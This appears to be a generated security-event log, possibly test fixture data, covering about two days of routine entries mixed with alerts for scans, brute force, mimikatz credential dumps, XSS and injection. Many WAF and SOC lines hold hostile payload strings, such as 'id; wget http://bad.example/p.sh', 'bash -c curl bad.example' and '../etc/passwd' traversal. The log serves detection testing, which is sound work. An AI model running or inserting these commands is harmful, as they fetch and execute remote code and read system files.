+2026-04-03T07:24:00 HIGH soc: DDoS amplification flood detected src=203.0.113.87 pps=297
+2026-04-03T07:36:00 INFO mailgw: message_id=<M-0278@corp.local> from=alerts@trusted-vendor.com verdict=clean
+2026-04-03T07:48:00 INFO dashboard: /api/summary request served src=203.0.113.89 response_ms=299
+2026-04-03T08:00:00 WARNING sshd: Failed password for admin from 203.0.113.90 port 300 ssh2
+2026-04-03T08:12:00 INFO mailgw: message_id=<M-0281@corp.local> from=alerts@trusted-vendor.com verdict=clean
+2026-04-03T08:24:00 CRITICAL ids: nmap masscan scan detected from 203.0.113.92 against 10.20.0282.0/24
+2026-04-03T08:36:00 INFO dashboard: /api/summary request served src=203.0.113.93 response_ms=303
+2026-04-03T08:48:00 INFO app: routine health check passed host=node-0284 latency_ms=304 status=ok
+2026-04-03T09:00:00 INFO mailgw: message_id=<M-0285@corp.local> from=alerts@trusted-vendor.com verdict=clean
+2026-04-03T09:12:00 ALERT integrity: verify_event status=false reason=signature_mismatch event_id=evt-0286
+2026-04-03T09:24:00 CRITICAL ir: credential dump detected via mimikatz on host=dc-0287 source=203.0.113.97 pass-the-hash attempt=true
+2026-04-03T09:36:00 WARNING availability: RATE_EXCEEDED subject=203.0.113.98 current_rate=308/s threshold=200/s
+2026-04-03T09:48:00 INFO azure-blob: upload success container=sentinel-reports blob=report-0289.bin size=309
+2026-04-03T10:00:00 WARNING availability: RATE_EXCEEDED subject=203.0.113.100 current_rate=310/s threshold=200/s
+2026-04-03T10:12:00 INFO mailgw: message_id=<M-0291@corp.local> from=alerts@trusted-vendor.com verdict=clean
+2026-04-03T10:24:00 INFO auth: successful login for analyst from 203.0.113.102 mfa=pass session=s-0292
+2026-04-03T10:36:00 ALERT integrity: verify_event status=false reason=signature_mismatch event_id=evt-0293
+2026-04-03T10:48:00 EMERGENCY waf: SQL injection and command injection chain src=203.0.113.104 payload="union select ...; bash -c curl bad.example"
+2026-04-03T11:00:00 EMERGENCY soc: Failed password for root from 203.0.113.105; nmap masscan SYN.flood; union select drop table users; <script>alert(1)</script>; ../etc/passwd; id; wget http://bad.example/p.sh; mimikatz lsass hashdump ntlm; ransomware C2 command.and.control token=t-0295
+2026-04-03T11:12:00 WARNING sshd: Failed password for admin from 203.0.113.106 port 316 ssh2
+2026-04-03T11:24:00 CRITICAL ir: credential dump detected via mimikatz on host=dc-0297 source=203.0.113.107 pass-the-hash attempt=true
+2026-04-03T11:36:00 WARNING sshd: Failed password for admin from 203.0.113.108 port 318 ssh2
+2026-04-03T11:48:00 WARNING web-gw: suspicious request src=203.0.113.109 path=/app/search?q=1=1 blocked=soft
+2026-04-03T12:00:00 INFO mailgw: message_id=<M-0300@corp.local> from=alerts@trusted-vendor.com verdict=clean
+2026-04-03T12:12:00 INFO availability: heartbeat service=threat-detector status=ok latency_ms=321
+2026-04-03T12:24:00 INFO availability: heartbeat service=threat-detector status=ok latency_ms=322
+2026-04-03T12:36:00 INFO auth: successful login for analyst from 203.0.113.113 mfa=pass session=s-0303
+2026-04-03T12:48:00 INFO dashboard: /api/summary request served src=203.0.113.114 response_ms=324
+2026-04-03T13:00:00 INFO availability: heartbeat service=threat-detector status=ok latency_ms=325
+2026-04-03T13:12:00 WARNING availability: RATE_EXCEEDED subject=203.0.113.116 current_rate=326/s threshold=200/s
+2026-04-03T13:24:00 INFO mailgw: message_id=<M-0307@corp.local> from=alerts@trusted-vendor.com verdict=clean
+2026-04-03T13:36:00 INFO mailgw: message_id=<M-0308@corp.local> from=alerts@trusted-vendor.com verdict=clean
+2026-04-03T13:48:00 INFO azure-blob: upload success container=sentinel-reports blob=report-0309.bin size=329
+2026-04-03T14:00:00 INFO azure-blob: upload success container=sentinel-reports blob=report-0310.bin size=330
+2026-04-03T14:12:00 INFO auth: successful login for analyst from 203.0.113.121 mfa=pass session=s-0311
+2026-04-03T14:24:00 INFO dashboard: /api/summary request served src=203.0.113.122 response_ms=332
+2026-04-03T14:36:00 HIGH soc: DDoS amplification flood detected src=203.0.113.123 pps=333
+2026-04-03T14:48:00 INFO auth: successful login for analyst from 203.0.113.124 mfa=pass session=s-0314
+2026-04-03T15:00:00 INFO auth: successful login for analyst from 203.0.113.125 mfa=pass session=s-0315
+2026-04-03T15:12:00 CRITICAL ids: nmap masscan scan detected from 203.0.113.126 against 10.20.0316.0/24
+2026-04-03T15:24:00 CRITICAL network: ddos reflection flood and malware rootkit keylogger activity correlated attacker=203.0.113.127 campaign=camp-0317
+2026-04-03T15:36:00 WARNING availability: RATE_EXCEEDED subject=203.0.113.128 current_rate=338/s threshold=200/s
+2026-04-03T15:48:00 INFO mailgw: message_id=<M-0319@corp.local> from=alerts@trusted-vendor.com verdict=clean
+2026-04-03T16:00:00 WARNING availability: RATE_EXCEEDED subject=203.0.113.130 current_rate=340/s threshold=200/s
+2026-04-03T16:12:00 INFO azure-blob: upload success container=sentinel-reports blob=report-0321.bin size=341
+2026-04-03T16:24:00 INFO auth: successful login for analyst from 203.0.113.132 mfa=pass session=s-0322
+2026-04-03T16:36:00 WARNING waf: path traversal blocked request=/assets/../../etc/passwd src=203.0.113.133
+2026-04-03T16:48:00 ALERT integrity: verify_event status=false reason=signature_mismatch event_id=evt-0324
+2026-04-03T17:00:00 NOTICE backup: incremental snapshot completed server=soc-sql-0325 duration_s=345
+2026-04-03T17:12:00 INFO mailgw: message_id=<M-0326@corp.local> from=alerts@trusted-vendor.com verdict=clean
+2026-04-03T17:24:00 WARNING availability: RATE_EXCEEDED subject=203.0.113.137 current_rate=347/s threshold=200/s
+2026-04-03T17:36:00 CRITICAL network: ddos reflection flood and malware rootkit keylogger activity correlated attacker=203.0.113.138 campaign=camp-0328
+2026-04-03T17:48:00 WARNING availability: RATE_EXCEEDED subject=203.0.113.139 current_rate=349/s threshold=200/s
+2026-04-03T18:00:00 CRITICAL ir: credential dump detected via mimikatz on host=dc-0330 source=203.0.113.140 pass-the-hash attempt=true
+2026-04-03T18:12:00 ALERT waf: XSS attempt blocked pattern=<script>alert("x")</script> src=203.0.113.141
+2026-04-03T18:24:00 INFO auth: successful login for analyst from 203.0.113.142 mfa=pass session=s-0332
+2026-04-03T18:36:00 CRITICAL network: ddos reflection flood and malware rootkit keylogger activity correlated attacker=203.0.113.143 campaign=camp-0333
+2026-04-03T18:48:00 WARNING sshd: Failed password for admin from 203.0.113.144 port 354 ssh2
+2026-04-03T19:00:00 NOTICE backup: incremental snapshot completed server=soc-sql-0335 duration_s=355
+2026-04-03T19:12:00 ALERT integrity: verify_event status=false reason=signature_mismatch event_id=evt-0336
+2026-04-03T19:24:00 INFO app: routine health check passed host=node-0337 latency_ms=357 status=ok
+2026-04-03T19:36:00 WARNING email-scanner: phishing_keywords matched="verify your account" sender=notice-0338@example-mail.net
+2026-04-03T19:48:00 INFO auth: successful login for analyst from 203.0.113.149 mfa=pass session=s-0339
+2026-04-03T20:00:00 ALERT waf: XSS attempt blocked pattern=<script>alert("x")</script> src=203.0.113.150
+2026-04-03T20:12:00 NOTICE backup: incremental snapshot completed server=soc-sql-0341 duration_s=361
+2026-04-03T20:24:00 INFO availability: heartbeat service=threat-detector status=ok latency_ms=362
+2026-04-03T20:36:00 WARNING web-gw: suspicious request src=203.0.113.153 path=/app/search?q=1=1 blocked=soft
+2026-04-03T20:48:00 INFO availability: heartbeat service=threat-detector status=ok latency_ms=364
+2026-04-03T21:00:00 WARNING scanner: vuln_pattern matched service=nginx finding=CVE-2023-44487 confidence=0.72 src=203.0.113.155
+2026-04-03T21:12:00 INFO dashboard: /api/summary request served src=203.0.113.156 response_ms=366
+2026-04-03T21:24:00 CRITICAL waf: command injection blocked payload="id; wget http://bad.example/p.sh" src=203.0.113.157
+2026-04-03T21:36:00 WARNING sshd: Failed password for admin from 203.0.113.158 port 368 ssh2
+2026-04-03T21:48:00 INFO app: routine health check passed host=node-0349 latency_ms=369 status=ok
+2026-04-03T22:00:00 INFO app: routine health check passed host=node-0350 latency_ms=370 status=ok
+2026-04-03T22:12:00 EMERGENCY soc: Failed password for root from 203.0.113.161; nmap masscan SYN.flood; union select drop table users; <script>alert(1)</script>; ../etc/passwd; id; wget http://bad.example/p.sh; mimikatz lsass hashdump ntlm; ransomware C2 command.and.control token=t-0351
+2026-04-03T22:24:00 INFO dashboard: /api/summary request served src=203.0.113.162 response_ms=372
+2026-04-03T22:36:00 INFO mailgw: message_id=<M-0353@corp.local> from=alerts@trusted-vendor.com verdict=clean
+2026-04-03T22:48:00 CRITICAL waf: command injection blocked payload="id; wget http://bad.example/p.sh" src=203.0.113.164
+2026-04-03T23:00:00 NOTICE backup: incremental snapshot completed server=soc-sql-0355 duration_s=375
+2026-04-03T23:12:00 INFO azure-blob: upload success container=sentinel-reports blob=report-0356.bin size=376
+2026-04-03T23:24:00 INFO auth: successful login for analyst from 203.0.113.167 mfa=pass session=s-0357
+2026-04-03T23:36:00 INFO app: routine health check passed host=node-0358 latency_ms=378 status=ok
+2026-04-03T23:48:00 INFO app: routine health check passed host=node-0359 latency_ms=379 status=ok
+2026-04-04T00:00:00 INFO auth: successful login for analyst from 203.0.113.170 mfa=pass session=s-0360
+2026-04-04T00:12:00 CRITICAL waf: command injection blocked payload="id; wget http://bad.example/p.sh" src=203.0.113.171
+2026-04-04T00:24:00 HIGH soc: DDoS amplification flood detected src=203.0.113.172 pps=382
+2026-04-04T00:36:00 CRITICAL ids: nmap masscan scan detected from 203.0.113.173 against 10.20.0363.0/24
+2026-04-04T00:48:00 INFO auth: successful login for analyst from 203.0.113.174 mfa=pass session=s-0364
+2026-04-04T01:00:00 INFO azure-blob: upload success container=sentinel-reports blob=report-0365.bin size=385
+2026-04-04T01:12:00 WARNING scanner: vuln_pattern matched service=nginx finding=CVE-2023-44487 confidence=0.72 src=203.0.113.176
+2026-04-04T01:24:00 INFO dashboard: /api/summary request served src=203.0.113.177 response_ms=387
+2026-04-04T01:36:00 INFO auth: successful login for analyst from 203.0.113.178 mfa=pass session=s-0368
+2026-04-04T01:48:00 INFO dashboard: /api/summary request served src=203.0.113.179 response_ms=389
+2026-04-04T02:00:00 EMERGENCY soc: Failed password for root from 203.0.113.180; nmap masscan SYN.flood; union select drop table users; <script>alert(1)</script>; ../etc/passwd; id; wget http://bad.example/p.sh; mimikatz lsass hashdump ntlm; ransomware C2 command.and.control token=t-0370
+2026-04-04T02:12:00 INFO azure-blob: upload success container=sentinel-reports blob=report-0371.bin size=391
+2026-04-04T02:24:00 INFO dashboard: /api/summary request served src=203.0.113.182 response_ms=392
+2026-04-04T02:36:00 WARNING web-gw: suspicious request src=203.0.113.183 path=/app/search?q=1=1 blocked=soft
+2026-04-04T02:48:00 INFO azure-blob: upload success container=sentinel-reports blob=report-0374.bin size=394
+2026-04-04T03:00:00 INFO dashboard: /api/summary request served src=203.0.113.185 response_ms=395
+2026-04-04T03:12:00 INFO app: routine health check passed host=node-0376 latency_ms=396 status=ok
+2026-04-04T03:24:00 INFO auth: successful login for analyst from 203.0.113.187 mfa=pass session=s-0377
+2026-04-04T03:36:00 INFO auth: successful login for analyst from 203.0.113.188 mfa=pass session=s-0378
+2026-04-04T03:48:00 CRITICAL ids: nmap masscan scan detected from 203.0.113.189 against 10.20.0379.0/24
+2026-04-04T04:00:00 EMERGENCY soc: Failed password for root from 203.0.113.190; nmap masscan SYN.flood; union select drop table users; <script>alert(1)</script>; ../etc/passwd; id; wget http://bad.example/p.sh; mimikatz lsass hashdump ntlm; ransomware C2 command.and.control token=t-0380
+2026-04-04T04:12:00 WARNING sshd: Failed password for admin from 203.0.113.191 port 401 ssh2
+2026-04-04T04:24:00 INFO auth: successful login for analyst from 203.0.113.192 mfa=pass session=s-0382
+2026-04-04T04:36:00 INFO availability: heartbeat service=threat-detector status=ok latency_ms=403
+2026-04-04T04:48:00 EMERGENCY soc: Failed password for root from 203.0.113.194; nmap masscan SYN.flood; union select drop table users; <script>alert(1)</script>; ../etc/passwd; id; wget http://bad.example/p.sh; mimikatz lsass hashdump ntlm; ransomware C2 command.and.control token=t-0384
+2026-04-04T05:00:00 CRITICAL waf: command injection blocked payload="id; wget http://bad.example/p.sh" src=203.0.113.195
+2026-04-04T05:12:00 INFO availability: heartbeat service=threat-detector status=ok latency_ms=406
+2026-04-04T05:24:00 INFO auth: successful login for analyst from 203.0.113.197 mfa=pass session=s-0387
+2026-04-04T05:36:00 WARNING scanner: vuln_pattern matched service=nginx finding=CVE-2023-44487 confidence=0.72 src=203.0.113.198
+2026-04-04T05:48:00 WARNING email-scanner: phishing_keywords matched="verify your account" sender=notice-0389@example-mail.net
+2026-04-04T06:00:00 INFO azure-blob: upload success container=sentinel-reports blob=report-0390.bin size=410
+2026-04-04T06:12:00 ALERT integrity: verify_event status=false reason=signature_mismatch event_id=evt-0391
+2026-04-04T06:24:00 INFO availability: heartbeat service=threat-detector status=ok latency_ms=412
+2026-04-04T06:36:00 WARNING scanner: vuln_pattern matched service=nginx finding=CVE-2023-44487 confidence=0.72 src=203.0.113.203
+2026-04-04T06:48:00 WARNING waf: path traversal blocked request=/assets/../../etc/passwd src=203.0.113.204
+2026-04-04T07:00:00 CRITICAL ir: credential dump detected via mimikatz on host=dc-0395 source=203.0.113.205 pass-the-hash attempt=true
+2026-04-04T07:12:00 WARNING scanner: vuln_pattern matched service=nginx finding=CVE-2023-44487 confidence=0.72 src=203.0.113.206
+2026-04-04T07:24:00 NOTICE backup: incremental snapshot completed server=soc-sql-0397 duration_s=417
+2026-04-04T07:36:00 WARNING waf: path traversal blocked request=/assets/../../etc/passwd src=203.0.113.208
+2026-04-04T07:48:00 INFO azure-blob: upload success container=sentinel-reports blob=report-0399.bin size=419
+2026-04-04T08:00:00 WARNING email-scanner: phishing_keywords matched="verify your account" sender=notice-0400@example-mail.net
+2026-04-04T08:12:00 INFO availability: heartbeat service=threat-detector status=ok latency_ms=421
+2026-04-04T08:24:00 WARNING scanner: vuln_pattern matched service=nginx finding=CVE-2023-44487 confidence=0.72 src=203.0.113.12
+2026-04-04T08:36:00 WARNING scanner: vuln_pattern matched service=nginx finding=CVE-2023-44487 confidence=0.72 src=203.0.113.13
+2026-04-04T08:48:00 CRITICAL ids: nmap masscan scan detected from 203.0.113.14 against 10.20.0404.0/24
+2026-04-04T09:00:00 ALERT integrity: verify_event status=false reason=signature_mismatch event_id=evt-0405
+2026-04-04T09:12:00 INFO availability: heartbeat service=threat-detector status=ok latency_ms=426
+2026-04-04T09:24:00 INFO app: routine health check passed host=node-0407 latency_ms=427 status=ok
+2026-04-04T09:36:00 INFO auth: successful login for analyst from 203.0.113.18 mfa=pass session=s-0408
+2026-04-04T09:48:00 INFO dashboard: /api/summary request served src=203.0.113.19 response_ms=429
+2026-04-04T10:00:00 INFO availability: heartbeat service=threat-detector status=ok latency_ms=430
+2026-04-04T10:12:00 INFO dashboard: /api/summary request served src=203.0.113.21 response_ms=431
+2026-04-04T10:24:00 CRITICAL ids: nmap masscan scan detected from 203.0.113.22 against 10.20.0412.0/24
+2026-04-04T10:36:00 INFO auth: successful login for analyst from 203.0.113.23 mfa=pass session=s-0413
+2026-04-04T10:48:00 CRITICAL ir: credential dump detected via mimikatz on host=dc-0414 source=203.0.113.24 pass-the-hash attempt=true
+2026-04-04T11:00:00 CRITICAL waf: command injection blocked payload="id; wget http://bad.example/p.sh" src=203.0.113.25
+2026-04-04T11:12:00 CRITICAL ids: nmap masscan scan detected from 203.0.113.26 against 10.20.0416.0/24
+2026-04-04T11:24:00 WARNING email-scanner: phishing_keywords matched="verify your account" sender=notice-0417@example-mail.net
+2026-04-04T11:36:00 WARNING web-gw: suspicious request src=203.0.113.28 path=/app/search?q=1=1 blocked=soft
+2026-04-04T11:48:00 INFO dashboard: /api/summary request served src=203.0.113.29 response_ms=439
+2026-04-04T12:00:00 INFO azure-blob: upload success container=sentinel-reports blob=report-0420.bin size=440
+2026-04-04T12:12:00 INFO mailgw: message_id=<M-0421@corp.local> from=alerts@trusted-vendor.com verdict=clean
+2026-04-04T12:24:00 WARNING availability: RATE_EXCEEDED subject=203.0.113.32 current_rate=442/s threshold=200/s
+2026-04-04T12:36:00 INFO availability: heartbeat service=threat-detector status=ok latency_ms=443
+2026-04-04T12:48:00 HIGH soc: DDoS amplification flood detected src=203.0.113.34 pps=444
+2026-04-04T13:00:00 WARNING web-gw: suspicious request src=203.0.113.35 path=/app/search?q=1=1 blocked=soft
+2026-04-04T13:12:00 INFO auth: successful login for analyst from 203.0.113.36 mfa=pass session=s-0426
+2026-04-04T13:24:00 INFO mailgw: message_id=<M-0427@corp.local> from=alerts@trusted-vendor.com verdict=clean
+2026-04-04T13:36:00 INFO availability: heartbeat service=threat-detector status=ok latency_ms=448
+2026-04-04T13:48:00 INFO dashboard: /api/summary request served src=203.0.113.39 response_ms=449
+2026-04-04T14:00:00 INFO auth: successful login for analyst from 203.0.113.40 mfa=pass session=s-0430
+2026-04-04T14:12:00 ALERT integrity: verify_event status=false reason=signature_mismatch event_id=evt-0431
+2026-04-04T14:24:00 CRITICAL ids: nmap masscan scan detected from 203.0.113.42 against 10.20.0432.0/24
+2026-04-04T14:36:00 WARNING scanner: vuln_pattern matched service=nginx finding=CVE-2023-44487 confidence=0.72 src=203.0.113.43
+2026-04-04T14:48:00 NOTICE backup: incremental snapshot completed server=soc-sql-0434 duration_s=454
+2026-04-04T15:00:00 HIGH soc: DDoS amplification flood detected src=203.0.113.45 pps=455
+2026-04-04T15:12:00 WARNING endpoint: malware indicator ransomware C2 beacon observed host=ws-0436 src=203.0.113.46
+2026-04-04T15:24:00 INFO azure-blob: upload success container=sentinel-reports blob=report-0437.bin size=457
+2026-04-04T15:36:00 INFO app: routine health check passed host=node-0438 latency_ms=458 status=ok
+2026-04-04T15:48:00 INFO dashboard: /api/summary request served src=203.0.113.49 response_ms=459
+2026-04-04T16:00:00 WARNING email-scanner: phishing_keywords matched="verify your account" sender=notice-0440@example-mail.net
+2026-04-04T16:12:00 INFO availability: heartbeat service=threat-detector status=ok latency_ms=461
+2026-04-04T16:24:00 INFO auth: successful login for analyst from 203.0.113.52 mfa=pass session=s-0442
+2026-04-04T16:36:00 INFO app: routine health check passed host=node-0443 latency_ms=463 status=ok
+2026-04-04T16:48:00 WARNING web-gw: suspicious request src=203.0.113.54 path=/app/search?q=1=1 blocked=soft
+2026-04-04T17:00:00 WARNING web-gw: suspicious request src=203.0.113.55 path=/app/search?q=1=1 blocked=soft
+2026-04-04T17:12:00 INFO mailgw: message_id=<M-0446@corp.local> from=alerts@trusted-vendor.com verdict=clean
+2026-04-04T17:24:00 WARNING availability: RATE_EXCEEDED subject=203.0.113.57 current_rate=467/s threshold=200/s
+2026-04-04T17:36:00 ALERT waf: XSS attempt blocked pattern=<script>alert("x")</script> src=203.0.113.58
+2026-04-04T17:48:00 NOTICE backup: incremental snapshot completed server=soc-sql-0449 duration_s=469
+2026-04-04T18:00:00 INFO dashboard: /api/summary request served src=203.0.113.60 response_ms=470
+2026-04-04T18:12:00 INFO mailgw: message_id=<M-0451@corp.local> from=alerts@trusted-vendor.com verdict=clean
+2026-04-04T18:24:00 INFO azure-blob: upload success container=sentinel-reports blob=report-0452.bin size=472
+2026-04-04T18:36:00 WARNING email-scanner: phishing_keywords matched="verify your account" sender=notice-0453@example-mail.net
+2026-04-04T18:48:00 NOTICE backup: incremental snapshot completed server=soc-sql-0454 duration_s=474
+2026-04-04T19:00:00 WARNING sshd: Failed password for admin from 203.0.113.65 port 475 ssh2
+2026-04-04T19:12:00 NOTICE backup: incremental snapshot completed server=soc-sql-0456 duration_s=476
+2026-04-04T19:24:00 INFO azure-blob: upload success container=sentinel-reports blob=report-0457.bin size=477
+2026-04-04T19:36:00 INFO availability: heartbeat service=threat-detector status=ok latency_ms=478
+2026-04-04T19:48:00 INFO auth: successful login for analyst from 203.0.113.69 mfa=pass session=s-0459
+2026-04-04T20:00:00 WARNING scanner: vuln_pattern matched service=nginx finding=CVE-2023-44487 confidence=0.72 src=203.0.113.70
+2026-04-04T20:12:00 INFO dashboard: /api/summary request served src=203.0.113.71 response_ms=481
+2026-04-04T20:24:00 CRITICAL waf: command injection blocked payload="id; wget http://bad.example/p.sh" src=203.0.113.72
+2026-04-04T20:36:00 WARNING email-scanner: phishing_keywords matched="verify your account" sender=notice-0463@example-mail.net
+2026-04-04T20:48:00 WARNING availability: RATE_EXCEEDED subject=203.0.113.74 current_rate=484/s threshold=200/s
+2026-04-04T21:00:00 INFO app: routine health check passed host=node-0465 latency_ms=485 status=ok
+2026-04-04T21:12:00 WARNING availability: RATE_EXCEEDED subject=203.0.113.76 current_rate=486/s threshold=200/s
+2026-04-04T21:24:00 HIGH soc: DDoS amplification flood detected src=203.0.113.77 pps=487
+2026-04-04T21:36:00 CRITICAL network: ddos reflection flood and malware rootkit keylogger activity correlated attacker=203.0.113.78 campaign=camp-0468
+2026-04-04T21:48:00 CRITICAL ir: credential dump detected via mimikatz on host=dc-0469 source=203.0.113.79 pass-the-hash attempt=true
+2026-04-04T22:00:00 WARNING email-scanner: phishing_keywords matched="verify your account" sender=notice-0470@example-mail.net
+2026-04-04T22:12:00 WARNING availability: RATE_EXCEEDED subject=203.0.113.81 current_rate=491/s threshold=200/s
+2026-04-04T22:24:00 EMERGENCY soc: Failed password for root from 203.0.113.82; nmap masscan SYN.flood; union select drop table users; <script>alert(1)</script>; ../etc/passwd; id; wget http://bad.example/p.sh; mimikatz lsass hashdump ntlm; ransomware C2 command.and.control token=t-0472
+2026-04-04T22:36:00 INFO auth: successful login for analyst from 203.0.113.83 mfa=pass session=s-0473
+2026-04-04T22:48:00 ALERT integrity: verify_event status=false reason=signature_mismatch event_id=evt-0474
+2026-04-04T23:00:00 ALERT waf: XSS attempt blocked pattern=<script>alert("x")</script> src=203.0.113.85
+2026-04-04T23:12:00 INFO app: routine health check passed host=node-0476 latency_ms=496 status=ok
+2026-04-04T23:24:00 INFO auth: successful login for analyst from 203.0.113.87 mfa=pass session=s-0477
+2026-04-04T23:36:00 INFO availability: heartbeat service=threat-detector status=ok latency_ms=498
+2026-04-04T23:48:00 NOTICE backup: incremental snapshot completed server=soc-sql-0479 duration_s=499
+2026-04-05T00:00:00 NOTICE backup: incremental snapshot completed server=soc-sql-0480 duration_s=500
+2026-04-05T00:12:00 ALERT waf: XSS attempt blocked pattern=<script>alert("x")</script> src=203.0.113.91
+2026-04-05T00:24:00 INFO mailgw: message_id=<M-0482@corp.local> from=alerts@trusted-vendor.com verdict=clean
+2026-04-05T00:36:00 WARNING scanner: vuln_pattern matched service=nginx finding=CVE-2023-44487 confidence=0.72 src=203.0.113.93
+2026-04-05T00:48:00 INFO azure-blob: upload success container=sentinel-reports blob=report-0484.bin size=504
+2026-04-05T01:00:00 INFO auth: successful login for analyst from 203.0.113.95 mfa=pass session=s-0485
+2026-04-05T01:12:00 INFO dashboard: /api/summary request served src=203.0.113.96 response_ms=506
+2026-04-05T01:24:00 CRITICAL ids: nmap masscan scan detected from 203.0.113.97 against 10.20.0487.0/24
+2026-04-05T01:36:00 INFO dashboard: /api/summary request served src=203.0.113.98 response_ms=508
+2026-04-05T01:48:00 INFO app: routine health check passed host=node-0489 latency_ms=509 status=ok
+2026-04-05T02:00:00 INFO azure-blob: upload success container=sentinel-reports blob=report-0490.bin size=510
+2026-04-05T02:12:00 CRITICAL ir: credential dump detected via mimikatz on host=dc-0491 source=203.0.113.101 pass-the-hash attempt=true
+2026-04-05T02:24:00 HIGH soc: DDoS amplification flood detected src=203.0.113.102 pps=512
+2026-04-05T02:36:00 CRITICAL network: ddos reflection flood and malware rootkit keylogger activity correlated attacker=203.0.113.103 campaign=camp-0493
+2026-04-05T02:48:00 INFO auth: successful login for analyst from 203.0.113.104 mfa=pass session=s-0494
+2026-04-05T03:00:00 INFO auth: successful login for analyst from 203.0.113.105 mfa=pass session=s-0495
+2026-04-05T03:12:00 INFO availability: heartbeat service=threat-detector status=ok latency_ms=516
+2026-04-05T03:24:00 CRITICAL ir: credential dump detected via mimikatz on host=dc-0497 source=203.0.113.107 pass-the-hash attempt=true
+2026-04-05T03:36:00 INFO auth: successful login for analyst from 203.0.113.108 mfa=pass session=s-0498
+2026-04-05T03:48:00 INFO availability: heartbeat service=threat-detector status=ok latency_ms=519
+2026-04-05T04:00:00 EMERGENCY waf: SQL injection and command injection chain src=203.0.113.110 payload="union select ...; bash -c curl bad.example"
+2026-04-05T04:12:00 INFO availability: heartbeat service=threat-detector status=ok latency_ms=21
+2026-04-05T04:24:00 INFO auth: successful login for analyst from 203.0.113.112 mfa=pass session=s-0502
+2026-04-05T04:36:00 WARNING waf: path traversal blocked request=/assets/../../etc/passwd src=203.0.113.113
+2026-04-05T04:48:00 INFO auth: successful login for analyst from 203.0.113.114 mfa=pass session=s-0504
+2026-04-05T05:00:00 INFO app: routine health check passed host=node-0505 latency_ms=25 status=ok
+2026-04-05T05:12:00 INFO availability: heartbeat service=threat-detector status=ok latency_ms=26
+2026-04-05T05:24:00 WARNING sshd: Failed password for admin from 203.0.113.117 port 27 ssh2
+2026-04-05T05:36:00 WARNING scanner: vuln_pattern matched service=nginx finding=CVE-2023-44487 confidence=0.72 src=203.0.113.118
+2026-04-05T05:48:00 INFO azure-blob: upload success container=sentinel-reports blob=report-0509.bin size=29
+2026-04-05T06:00:00 INFO azure-blob: upload success container=sentinel-reports blob=report-0510.bin size=30
+2026-04-05T06:12:00 INFO app: routine health check passed host=node-0511 latency_ms=31 status=ok
+2026-04-05T06:24:00 CRITICAL waf: command injection blocked payload="id; wget http://bad.example/p.sh" src=203.0.113.122
+2026-04-05T06:36:00 NOTICE backup: incremental snapshot completed server=soc-sql-0513 duration_s=33
+2026-04-05T06:48:00 ALERT waf: XSS attempt blocked pattern=<script>alert("x")</script> src=203.0.113.124
+2026-04-05T07:00:00 INFO mailgw: message_id=<M-0515@corp.local> from=alerts@trusted-vendor.com verdict=clean
+2026-04-05T07:12:00 INFO mailgw: message_id=<M-0516@corp.local> from=alerts@trusted-vendor.com verdict=clean
+2026-04-05T07:24:00 INFO auth: successful login for analyst from 203.0.113.127 mfa=pass session=s-0517
+2026-04-05T07:36:00 INFO azure-blob: upload success container=sentinel-reports blob=report-0518.bin size=38
+2026-04-05T07:48:00 INFO azure-blob: upload success container=sentinel-reports blob=report-0519.bin size=39
+2026-04-05T08:00:00 INFO availability: heartbeat service=threat-detector status=ok latency_ms=40
+2026-04-05T08:12:00 INFO availability: heartbeat service=threat-detector status=ok latency_ms=41
+2026-04-05T08:24:00 INFO mailgw: message_id=<M-0522@corp.local> from=alerts@trusted-vendor.com verdict=clean
+2026-04-05T08:36:00 ALERT waf: XSS attempt blocked pattern=<script>alert("x")</script> src=203.0.113.133
+2026-04-05T08:48:00 EMERGENCY soc: Failed password for root from 203.0.113.134; nmap masscan SYN.flood; union select drop table users; <script>alert(1)</script>; ../etc/passwd; id; wget http://bad.example/p.sh; mimikatz lsass hashdump ntlm; ransomware C2 command.and.control token=t-0524
+2026-04-05T09:00:00 INFO mailgw: message_id=<M-0525@corp.local> from=alerts@trusted-vendor.com verdict=clean
+2026-04-05T09:12:00 EMERGENCY waf: SQL injection and command injection chain src=203.0.113.136 payload="union select ...; bash -c curl bad.example"
+2026-04-05T09:24:00 WARNING availability: RATE_EXCEEDED subject=203.0.113.137 current_rate=47/s threshold=200/s
+2026-04-05T09:36:00 INFO availability: heartbeat service=threat-detector status=ok latency_ms=48
+2026-04-05T09:48:00 EMERGENCY soc: Failed password for root from 203.0.113.139; nmap masscan SYN.flood; union select drop table users; <script>alert(1)</script>; ../etc/passwd; id; wget http://bad.example/p.sh; mimikatz lsass hashdump ntlm; ransomware C2 command.and.control token=t-0529
+2026-04-05T10:00:00 CRITICAL waf: command injection blocked payload="id; wget http://bad.example/p.sh" src=203.0.113.140
+2026-04-05T10:12:00 INFO mailgw: message_id=<M-0531@corp.local> from=alerts@trusted-vendor.com verdict=clean
+2026-04-05T10:24:00 INFO auth: successful login for analyst from 203.0.113.142 mfa=pass session=s-0532
+2026-04-05T10:36:00 INFO dashboard: /api/summary request served src=203.0.113.143 response_ms=53
+2026-04-05T10:48:00 NOTICE backup: incremental snapshot completed server=soc-sql-0534 duration_s=54
+2026-04-05T11:00:00 NOTICE backup: incremental snapshot completed server=soc-sql-0535 duration_s=55
+2026-04-05T11:12:00 ALERT integrity: verify_event status=false reason=signature_mismatch event_id=evt-0536
+2026-04-05T11:24:00 WARNING endpoint: malware indicator ransomware C2 beacon observed host=ws-0537 src=203.0.113.147
+2026-04-05T11:36:00 INFO azure-blob: upload success container=sentinel-reports blob=report-0538.bin size=58
+2026-04-05T11:48:00 INFO app: routine health check passed host=node-0539 latency_ms=59 status=ok
+2026-04-05T12:00:00 INFO availability: heartbeat service=threat-detector status=ok latency_ms=60
+2026-04-05T12:12:00 WARNING web-gw: suspicious request src=203.0.113.151 path=/app/search?q=1=1 blocked=soft
+2026-04-05T12:24:00 CRITICAL ids: nmap masscan scan detected from 203.0.113.152 against 10.20.0542.0/24
+2026-04-05T12:36:00 CRITICAL ids: nmap masscan scan detected from 203.0.113.153 against 10.20.0543.0/24
+2026-04-05T12:48:00 EMERGENCY soc: Failed password for root from 203.0.113.154; nmap masscan SYN.flood; union select drop table users; <script>alert(1)</script>; ../etc/passwd; id; wget http://bad.example/p.sh; mimikatz lsass hashdump ntlm; ransomware C2 command.and.control token=t-0544
+2026-04-05T13:00:00 INFO auth: successful login for analyst from 203.0.113.155 mfa=pass session=s-0545
+2026-04-05T13:12:00 WARNING sshd: Failed password for admin from 203.0.113.156 port 66 ssh2
+2026-04-05T13:24:00 INFO dashboard: /api/summary request served src=203.0.113.157 response_ms=67
